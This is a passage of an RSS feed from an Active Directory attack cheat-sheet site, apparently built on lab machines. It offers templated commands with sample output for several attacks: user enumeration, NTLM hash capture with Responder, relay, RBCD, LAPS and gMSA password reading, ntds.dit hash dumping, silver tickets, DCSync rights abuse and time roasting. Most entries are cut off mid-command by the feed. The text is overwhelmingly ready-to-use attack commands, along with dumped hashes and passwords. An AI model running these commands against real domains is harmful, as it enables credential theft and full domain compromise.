      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>Users Enum kerbrute metasploit kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERS_FILE&amp;gt; $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 &amp;gt; Using KDC(s): 2024/09/24 14:54:41 &amp;gt; dc.</description>
    </item>
    <item>
      <title>Krbrelayx</title>
      <link>https://tldrbins.github.io/krbrelayx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/krbrelayx/</guid>
      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 $ sudo responder -I tun0 ---[SNIP]--- [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:d7c67a8cpython3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;TARGET_RECORD&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;TARGET_IP&amp;gt; $ python3 dnstool.py -u &amp;#39;intelligence\Tiffany.Molina&amp;#39; -p &amp;#39;NewIntelligenceCorpUser9876&amp;#39; --action add --record web-test --data 10.10.14.31 10.</description>
    </item>
    <item>
      <title>LDAP</title>
      <link>https://tldrbins.github.io/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap/</guid>
      <description>Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -D &amp;#34;CN=&amp;lt;USER&amp;gt;,CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With creds ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -o ./ldap # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; Enum with Kerberos ldapsearch nxc # Add GSSAPI sudo apt install libsasl2-modules-gssapi-mit ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -Y GSSAPI -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With kerberos nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --users Enum ACLs bloodyAD 1.</description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt PS C:\programdata&amp;gt; .\rubeus.exe tgtdeleg /nowrap /ptt ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build &amp;#39;cifs/dc.</description>
    </item>
    <item>
      <title>NetExec (nxc)</title>
      <link>https://tldrbins.github.io/nxc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nxc/</guid>
      <description>Basic Commands Password NTLM Kerberos # Single User, Single Password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Single User, Single Password, Local Auth nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth # Single User, Single Password (Active Directory) nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; # Single User, Multiple Passwords nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;lt;PASSWORDS&amp;gt; -d &amp;lt;DOMAIN&amp;gt; # Multiple Users, Single Password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; --continue-on-success # Multiple Users, Multiple Passwords nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; -d &amp;lt;DOMAIN&amp;gt; --continue-on-success # Match Username to Corresponding Password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; --no-bruteforce --continue-on-success nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;lt;HASH&amp;gt; # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k # With Kerberos ccache, or STATUS_NOT_SUPPORTED (NTLM disabled) sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --use-kcache Hint: We can also run on multiple targets</description>
    </item>
    <item>
      <title>NTLM Relay Attack</title>
      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
      <description>Abuse #1: Add Shadow Credential 1. Run socat to Redirect Traffic (Inside Pivoting Node) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable Webdav (Inside Windows Target) [Optional] $Source = @&amp;#34; using System; using System.</description>
    </item>
    <item>
      <title>Pre-Windows 2000 Computer</title>
      <link>https://tldrbins.github.io/pre-windows_2000_computer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/pre-windows_2000_computer/</guid>
      <description>Enum pre2k Installation python3 -m venv venv source venv/bin/activate git clone https://github.com/garrettfoster13/pre2k.git cd pre2k/ pip3 install . Query # Unauth pre2k unauth -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -dc-ip &amp;#39;&amp;lt;DC_IP&amp;gt;&amp;#39; -verbose -inputfile &amp;#39;&amp;lt;MACHINES_FILE&amp;gt;&amp;#39; $ cat machines.txt banking$ $ pre2k unauth -d example.com -dc-ip 192.168.1.10 -verbose -inputfile &amp;#39;machines.txt&amp;#39; ___ __ /&amp;#39;___`\ /\ \ _____ _ __ __ /\_\ /\ \\ \ \/&amp;#39;\ /\ &amp;#39;__`\/\`&amp;#39;__\/&amp;#39;__`\ _______\/_/// /__\ \ , &amp;lt; \ \ \L\ \ \ \//\ __//\______\ // /_\ \\ \ \\`\ \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\ \ \ \/ \/_/ \/____/ \/_____/ \/_/\/_/ \ \_\ v3.</description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M maq $ nxc ldap example.com -u &amp;#39;test.user&amp;#39; -p &amp;#39;Test1234&amp;#39; -M maq SMB 10.10.11.10 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False) LDAP 10.10.11.10 389 DC [+] example.com\test.user:Test1234 MAQ 10.10.11.10 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.11.10 389 DC MachineAccountQuota: 10 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
    </item>
    <item>
      <title>ReadGMSAPassword</title>
      <link>https://tldrbins.github.io/readgmsapassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
      <description>Abuse #1: Read GMSAPassword (From Linux) 1. Set Allowed to Retrieve the Password for this MSA [Optional] Set-ADServiceAccount -Identity &amp;#34;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#34; -PrincipalsAllowedToRetrieveManagedPassword &amp;#34;&amp;lt;USER&amp;gt;&amp;#34; 2. Read GMSA Password gMSADumper bloodyAD nxc # Password python3 gMSADumper.py -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; $ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: &amp;gt; DC$ &amp;gt; itsupport svc_int$:::745bd2c68dfc101a74f48d87027c7dc6 svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3 # NTLM python3 gMSADumper.</description>
    </item>
    <item>
      <title>ReadLAPSPassword</title>
      <link>https://tldrbins.github.io/readlapspassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readlapspassword/</guid>
      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b &amp;#39;DC=LicorDeBellota,DC=HTB&amp;#39; -x -D bob@LicorDeBellota.htb -w &amp;#39;Test1234!@&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base &amp;lt;DC=LicorDeBellota,DC=HTB&amp;gt; with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.</description>
    </item>
    <item>
      <title>RPC</title>
      <link>https://tldrbins.github.io/rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rpc/</guid>
      <description>Remote Procedure Call Tools rpcclient impacket # Anonymous rpcclient -U &amp;#39;&amp;#39; -N &amp;lt;TARGET&amp;gt; $ rpcclient -U &amp;#39;&amp;#39; -N 10.10.10.172 rpcclient $&amp;gt; # Password rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # NTLM rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;HASH&amp;gt;&amp;#39; --pw-nt-hash &amp;lt;TARGET&amp;gt; # Inline Execute Command rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo rpcclient $&amp;gt; querydispinfo index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</description>
    </item>
    <item>
      <title>SCCM</title>
      <link>https://tldrbins.github.io/sccm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sccm/</guid>
      <description>Enum Windows 1. Import Module . .\PowerSCCM.ps1 PS C:\programdata&amp;gt; . .\PowerSCCM.ps1 Ref: PowerSCCM.ps1&#xA;2. Find SccmSiteCode Find-SccmSiteCode -ComputerName &amp;lt;TARGET_COMPUTER&amp;gt; PS C:\programdata&amp;gt; Find-SccmSiteCode -ComputerName sccm.example.local Find-SccmSiteCode -ComputerName sccm.example.local SiteCode -------- GH1 3. New SccmSession New-SccmSession -ComputerName &amp;lt;TARGET_COMPUTER&amp;gt; -SiteCode &amp;lt;SITE_CODE&amp;gt; -ConnectionType wmi PS C:\programdata&amp;gt; New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi Id : 1 Name : GH11 ComputerName : SCCM Credential : SiteCode : GH1 ConnectionType : wmi SccmVersion : 5 Permissions : {ALL} Provider : \\SCCM\ROOT\sms:SMS_ProviderLocation.</description>
    </item>
    <item>
      <title>secretsdump</title>
      <link>https://tldrbins.github.io/secretsdump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secretsdump/</guid>
      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: ---[SNIP]--- [*] Cleaning up.</description>
    </item>
    <item>
      <title>SeEnableDelegationPrivilege</title>
      <link>https://tldrbins.github.io/seenabledelegationprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seenabledelegationprivilege/</guid>
      <description>Abuse #1: Constrained Delegation Linux Windows 1. Control of a Machine Account bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ bloodyAD -d REDELEGATE.VL -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; --host DC.REDELEGATE.VL set password &amp;#39;FS01$&amp;#39; &amp;#39;Fall2024!&amp;#39; [+] Password changed successfully! 2. Set msDS-AllowedToDelegateTo to Target SPN bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;ldap/&amp;lt;DC&amp;gt;&amp;#39; $ bloodyAD -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; -d &amp;#39;REDELEGATE.</description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://tldrbins.github.io/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/silver_ticket/</guid>
      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) [optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 $ iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;REGGIE1234ronnie&amp;#39;) | openssl dgst -md4 MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf 3. Get domain SID sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ sudo ntpdate -s dc.</description>
    </item>
    <item>
      <title>Time Roasting</title>
      <link>https://tldrbins.github.io/time_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/time_roasting/</guid>
      <description>Time Roasting nxc # Anonymous nxc smb &amp;lt;DC&amp;gt; -M timeroast # Password nxc smb &amp;lt;DC&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -M timeroast # Kerberos sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; nxc smb &amp;lt;DC&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -d &amp;lt;DOMAIN&amp;gt; -M timeroast Hash Crack # Modified to Use rockyou.txt python3 timecrack.py &amp;lt;HASH_FILE&amp;gt; /usr/share/wordlists/rockyou.txt #!/usr/bin/env python3 &amp;#34;&amp;#34;&amp;#34;Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP &amp;#39;hash&amp;#39; format unfortunately does not fit into Hashcat or John right now.</description>
    </item>
    <item>
      <title>Windows Services</title>
      <link>https://tldrbins.github.io/server_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/server_operators/</guid>
      <description>Check unquoted service path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ---[SNIP]--- ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None ---[SNIP]--- Ref: Get-ServiceAcl.</description>
    </item>
    <item>
      <title>Winrm from Windows VM</title>
      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
    </item>
    <item>
      <title>WriteDacl</title>
      <link>https://tldrbins.github.io/writedacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writedacl/</guid>
      <description>Abuse #1: Add dcsync right to user Linux Windows powerview.py&#xA;1. Connect to DC # With password powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; # With hash powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -H &amp;lt;HASH&amp;gt; $ powerview &amp;#39;CORP.LOCAL/WEB01$@172.16.1.5&amp;#39; -H 7ddf32e17a6ac5ce04a8ecbf782ca509 (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; 2. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -TargetIdentity &amp;#39;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#39; -Rights DCSync (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; Add-DomainObjectAcl -PrincipalIdentity &amp;#39;WEB01$&amp;#39; -TargetIdentity &amp;#39;DC=corp,DC=local&amp;#39; -Rights DCSync [2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local [2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local [2024-10-01 12:51:36] DACL modified successfully!</description>
    </item>
    <item>
      <title>WriteOwner/Own</title>
      <link>https://tldrbins.github.io/writeowner/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writeowner/</guid>
      <description>Abuse #1 : Change Owner of the Group/User Linux Windows 1. Powerview.py # Password powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; $ powerview &amp;#39;CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB&amp;#39; ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:&amp;lt;auto&amp;gt;] ╰─PV ❯ # NTLM powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; 2. Change Owner Set-DomainObjectOwner -TargetIdentity &amp;#39;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#39; -PrincipalIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:&amp;lt;auto&amp;gt;] ╰─PV ❯ Set-DomainObjectOwner -TargetIdentity &amp;#39;Management&amp;#39; -PrincipalIdentity &amp;#39;judith.mader&amp;#39; [2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103 [2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .</description>
    </item>
    <item>
      <title>WriteSPN</title>
      <link>https://tldrbins.github.io/writespn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writespn/</guid>
